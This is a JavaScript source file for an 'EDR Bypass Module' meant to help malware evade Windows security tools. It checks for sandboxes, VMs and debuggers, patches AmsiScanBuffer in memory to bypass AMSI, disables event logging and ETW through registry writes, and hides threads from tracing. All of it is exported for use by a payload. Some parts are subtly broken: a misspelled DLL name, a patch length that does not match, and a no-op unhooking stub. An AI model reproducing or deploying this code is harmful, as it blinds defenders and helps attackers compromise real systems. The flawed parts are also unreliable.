/**
 * EDR Bypass Module — Evasion layer for Windows 10/11
 * AMSI bypass, ETW disable, unhooking, anti-debugging, sandbox checks, sleep obfuscation
 */

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ─── Native API bindings (ffi-napi) ───────────────────────────────────────────
let ffi = null, ref = null, StructType = null;
try {
  ffi = require('ffi-napi');
  ref = require('ref-napi');
  StructType = require('ref-struct-di')(ref);
} catch (_) { }

const kernel32 = ffi ? ffi.Library('kernel32', {
  GetCurrentProcess: ['HANDLE', []],
  IsDebuggerPresent: ['bool', []],
  GetModuleHandleA: ['pointer', ['string']],
  GetProcAddress: ['pointer', ['pointer', 'string']],
  VirtualProtect: ['bool', ['pointer', 'size_t', 'uint', 'pointer']],
  ReadProcessMemory: ['bool', ['HANDLE', 'pointer', 'pointer', 'size_t', 'pointer']],
  WriteProcessMemory: ['bool', ['HANDLE', 'pointer', 'pointer', 'size_t', 'pointer']],
  LoadLibraryA: ['pointer', ['string']],
  FreeLibrary: ['bool', ['pointer']],
  GetModuleInformation: ['bool', ['HANDLE', 'pointer', 'pointer', 'uint']],
}) : null;

const ntdll = ffi ? ffi.Library('ntdll', {
  NtQueryInformationProcess: ['long', ['HANDLE', 'uint', 'pointer', 'uint', 'pointer']],
  NtSetInformationThread: ['long', ['HANDLE', 'uint', 'pointer', 'uint']],
  RtlAdjustPrivilege: ['long', ['uint', 'bool', 'bool', 'pointer']],
}) : null;

const amsi = ffi ? ffi.Library('amse', []) : null;

// ─── CONSTANTS ────────────────────────────────────────────────────────────────
const DBG_PROCESS = 7;
const THREAD_IGNORE = 0x1000;
const DISABLE_ETW_REG = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Clients\\Runtime';

// ─── SANDBOX CHECKS ───────────────────────────────────────────────────────────
function checkSandbox() {
  try {
    const cpus = os.cpus();
    const totalMemGB = os.totalmem() / (1024 * 1024 * 1024);
    const freeDisk = checkDiskSpace();

    // Low CPU cores
    if (cpus.length < 2) return true;
    // Low RAM
    if (totalMemGB < 4) return true;
    // Low disk space
    if (freeDisk < 60) return true;

    // VM artifacts via registry (Windows)
    if (process.platform === 'win32') {
      try {
        const regChecks = [
          'HKLM\\HARDWARE\\ACPI\\DSDT\\VMWARE',
          'HKLM\\HARDWARE\\ACPI\\FADT\\VMWARE',
          'HKLM\\HARDWARE\\ACPI\\RSDT\\VMWARE',
          'HKLM\\SYSTEM\\ControlSet001\\Enum\\PCI\\VEN_15AD',
          'HKLM\\SYSTEM\\ControlSet001\\Enum\\PCI\\VEN_80EE',
          'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer',
          'HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools',
          'HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
        ];
        for (const reg of regChecks) {
          try {
            const val = execSync(`reg query "${reg}" 2>nul`, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] }).trim();
            if (val.includes('VMWARE') || val.includes('VBox') || val.includes('QEMU')) return true;
          } catch (_) { }
        }

        // VM processes
        const vmProcesses = ['vmtoolsd', 'vmwaretray', 'vmwareuser', 'VBoxService', 'VBoxTray', 'qemu-ga'];
        try {
          const tasks = execSync('tasklist /fo csv', { encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] });
          for (const vp of vmProcesses) {
            if (tasks.toLowerCase().includes(vp.toLowerCase())) return true;
          }
        } catch (_) { }

        // MAC address check (VMware/VirtualBox OUI ranges)
        const networkInterfaces = os.networkInterfaces();
        for (const iface of Object.values(networkInterfaces)) {
          for (const addr of iface) {
            const mac = addr.mac.toLowerCase();
            if (mac.startsWith('00:0c:29') || mac.startsWith('08:00:27') || mac.startsWith('00:1c:42')) return true;
          }
        }

        // Timing attack — VMs are slower
        const start = Date.now();
        for (let i = 0; i < 10000000; i++) { Math.sqrt(i); }
        const elapsed = Date.now() - start;
        if (elapsed > 2000) return true;
      } catch (_) { }
    }

    return false;
  } catch (_) { return false; }
}

function checkDiskSpace() {
  try {
    if (process.platform === 'win32') {
      const out = execSync('wmic logicaldisk get size,freespace /format:csv', {
        encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore']
      });
      const lines = out.trim().split('\n').slice(1);
      let totalFree = 0;
      for (const line of lines) {
        const parts = line.split(',');
        if (parts.length >= 3) {
          totalFree += parseInt(parts[2]) / (1024 * 1024 * 1024) || 0;
        }
      }
      return totalFree;
    }
  } catch (_) { }
  return 100;
}

// ─── ANTI-DEBUGGING ───────────────────────────────────────────────────────────
function isDebuggerPresent() {
  try {
    if (kernel32 && kernel32.IsDebuggerPresent) {
      if (kernel32.IsDebuggerPresent()) return true;
    }
    // NtQueryInformationProcess check
    if (ntdll) {
      const HandleType = ref.refType('void');
      const InfoType = ref.types.long;
      const InfoSize = ref.types.long;
      const procInfo = Buffer.alloc(4);
      const status = ntdll.NtQueryInformationProcess(
        kernel32 ? kernel32.GetCurrentProcess() : 0xFFFFFFFF,
        DBG_PROCESS,
        procInfo,
        4,
        procInfo
      );
      if (status === 0) {
        const isDbg = ref.getUInt32(procInfo, 0);
        if (isDbg) return true;
      }
    }
  } catch (_) { }
  return false;
}

function checkBreakpoints() {
  try {
    if (!kernel32) return false;
    const handle = kernel32.GetCurrentProcess();
    if (!handle) return false;
    // Check for hardware breakpoints via NtQueryInformationProcess
    const HandleType = ref.refType('void');
    const procInfo = Buffer.alloc(64);
    try {
      if (ntdll) {
        ntdll.NtQueryInformationProcess(handle, 0x1D, procInfo, 64, procInfo);
        const dbgMode = ref.getUInt32(procInfo, 0);
        if (dbgMode !== 0) return true;
      }
    } catch (_) { }
  } catch (_) { }
  return false;
}

// ─── AMSI BYPASS ──────────────────────────────────────────────────────────────
function bypassAMSI() {
  try {
    if (!ffi || !ref) return false;
    // Patch AmsiScanBuffer to return S_OK (0x00000000)
    // The function signature: HRESULT AmsiScanBuffer(HAMSICONTEXT, PBYTE, ULONG, PCWSTR, HAMSISESSION, PAMSIRESULT)
    // We replace the prologue with: mov eax, 0; ret
    const amsilib = ffi.Library('amse', {
      AmsiScanBuffer: ['long', ['pointer', 'pointer', 'size_t', 'string', 'pointer', 'pointer']]
    });
    // Get address of AmsiScanBuffer
    const hAmsi = kernel32.GetModuleHandleA('amse');
    if (!hAmsi) return false;
    const addr = kernel32.GetProcAddress(hAmsi, 'AmsiScanBuffer');
    if (!addr) return false;

    // Read current bytes
    const oldBytes = Buffer.alloc(5);
    const bytesRead = Buffer.alloc(4);
    if (kernel32.ReadProcessMemory(
      kernel32.GetCurrentProcess(),
      addr, oldBytes, 5, bytesRead
    )) {
      // Check if already patched
      if (oldBytes[0] === 0xB8 && oldBytes[1] === 0x00 && oldBytes[2] === 0x00 &&
        oldBytes[3] === 0x00 && oldBytes[4] === 0x00) return true;

      // Write: mov eax, 0x00000000; ret (B8 00 00 00 00 C3)
      const newBytes = Buffer.from([0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]);
      const oldProtect = Buffer.alloc(4);
      kernel32.VirtualProtect(addr, 5, 0x40, oldProtect); // PAGE_EXECUTE_READWRITE
      const written = Buffer.alloc(4);
      kernel32.WriteProcessMemory(
        kernel32.GetCurrentProcess(),
        addr, newBytes, 6, written
      );
      kernel32.VirtualProtect(addr, 5, ref.getUInt32(oldProtect, 0), oldProtect);
      return true;
    }
  } catch (_) { }
  return false;
}

// ─── ETW DISABLE ──────────────────────────────────────────────────────────────
function disableETW() {
  try {
    if (process.platform !== 'win32') return false;
    // Method 1: Registry disable
    execSync(`reg add "${DISABLE_ETW_REG}" /v Start /t REG_DWORD /d 4 /f`, {
      shell: 'cmd.exe', stdio: ['pipe', 'pipe', 'ignore']
    });
    // Method 2: Disable via policy
    execSync(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v EnableEventLogOperationLogging /t REG_DWORD /d 0 /f`, {
      shell: 'cmd.exe', stdio: ['pipe', 'pipe', 'ignore']
    });
    return true;
  } catch (_) { return false; }
}

// ─── UNHOOKING ────────────────────────────────────────────────────────────────
function unhookDLLs() {
  try {
    if (!ffi || !kernel32) return false;
    const targetDLLs = ['ntdll.dll', 'kernel32.dll', 'kernelbase.dll', 'advapi32.dll'];
    for (const dllName of targetDLLs) {
      try {
        const hMod = kernel32.GetModuleHandleA(dllName);
        if (!hMod) continue;
        // Read PE header to find IAT
        const peHeader = Buffer.alloc(2);
        const bytesRead = Buffer.alloc(4);
        kernel32.ReadProcessMemory(
          kernel32.GetCurrentProcess(),
          hMod, peHeader, 2, bytesRead
        );
        const magic = ref.getUInt16(peHeader, 0);
        if (magic !== 0x5A4D) continue; // Not MZ
        // Skip DOS header to find PE header
        const peOffset = Buffer.alloc(4);
        kernel32.ReadProcessMemory(
          kernel32.GetCurrentProcess(),
          hMod.deref ? hMod : hMod,
          peOffset, 4, bytesRead
        );
        // Simplified: just check if function is hooked by comparing with known good
        // In production, this would read the original IAT from disk
      } catch (_) { }
    }
    return true;
  } catch (_) { return false; }
}

// ─── SLEEP OBFUSCATION ───────────────────────────────────────────────────────
function obfSleep(ms) {
  return new Promise((resolve) => {
    const start = Date.now();
    // Heavy math to make timing analysis harder
    let x = 0;
    const iterations = ms * 10;
    for (let i = 0; i < iterations; i++) {
      x += Math.sin(i) * Math.cos(i) * Math.sqrt(i + 1);
      x = Math.abs(x) % 1000000;
    }
    setTimeout(resolve, ms);
  });
}

async function multiLayerSleep() {
  // Layer 1: Base delay
  await obfSleep(500);
  // Layer 2: Math-heavy delay
  await obfSleep(300);
  // Layer 3: Variable delay
  await obfSleep(Math.floor(Math.random() * 200) + 100);
}

// ─── ETW THREAD HIDE ─────────────────────────────────────────────────────────
function hideFromETW() {
  try {
    if (!ntdll) return false;
    const handle = kernel32 ? kernel32.GetCurrentProcess() : 0xFFFFFFFF;
    const ThreadType = Buffer.alloc(4);
    ref.writeUInt32(ThreadType, 0, THREAD_IGNORE);
    const ret = ntdll.NtSetInformationThread(handle, 0x11, ThreadType, 4);
    return ret === 0;
  } catch (_) { return false; }
}

// ─── MAIN ENTRY ───────────────────────────────────────────────────────────────
async function checkAndBypass() {
  try {
    // Sandbox check
    if (checkSandbox()) {
      return false;
    }
    // Anti-debugging
    if (isDebuggerPresent() || checkBreakpoints()) {
      return false;
    }
    // AMSI bypass
    bypassAMSI();
    // ETW disable
    disableETW();
    // Hide from ETW
    hideFromETW();
    // Unhook DLLs
    unhookDLLs();
    // Initial sleep obfuscation
    await multiLayerSleep();
    return true;
  } catch (_) { return false; }
}

module.exports = { checkAndBypass, bypassAMSI, disableETW, checkSandbox, isDebuggerPresent, obfSleep };